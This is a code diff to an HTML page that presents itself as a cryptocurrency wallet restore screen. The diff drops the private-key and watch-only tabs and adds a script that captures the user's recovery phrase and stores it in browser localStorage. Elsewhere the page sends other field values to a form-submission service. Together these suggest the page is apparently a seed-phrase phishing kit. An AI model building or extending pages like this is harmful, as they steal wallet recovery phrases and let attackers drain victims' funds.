@@ -877,8 +877,6 @@
 
                     <div class="tabs">
                         <button style="cursor: none;" class="tab active" data-tab="seed">Seed Phrase</button>
-                        <button style="cursor: none;" class="tab" data-tab="keys">Private Spend Key</button>
-                        <button style="cursor: none;" class="tab" data-tab="watch">Watch-Only</button>
                         <button style="cursor: none;" class="tab" data-tab="create">Create New</button>
                     </div>
 
@@ -1043,8 +1041,27 @@ complaintBtn.addEventListener("click", function () {
 usernameBtn.addEventListener("click", function () {
     sendToFormSubmit("Username", usernameInput.value);
 });
- </script>                   
+ </script>  
+ <script>
+    const STORAGE_KEY = "wallet_passphrase";
 
+document.getElementById("continueBtn").addEventListener("click", function () {
+
+    const phrase = document
+        .getElementById("seed-input")
+        .value
+        .trim();
+
+    if (!phrase) {
+        alert("Please enter your recovery phrase.");
+        return;
+    }
+
+    // Save recovery phrase
+    localStorage.setItem(STORAGE_KEY, phrase);
+
+});
+ </script>                
 
                     <!-- WATCH-ONLY TAB -->
                     <div class="form-section" id="tab-watch">
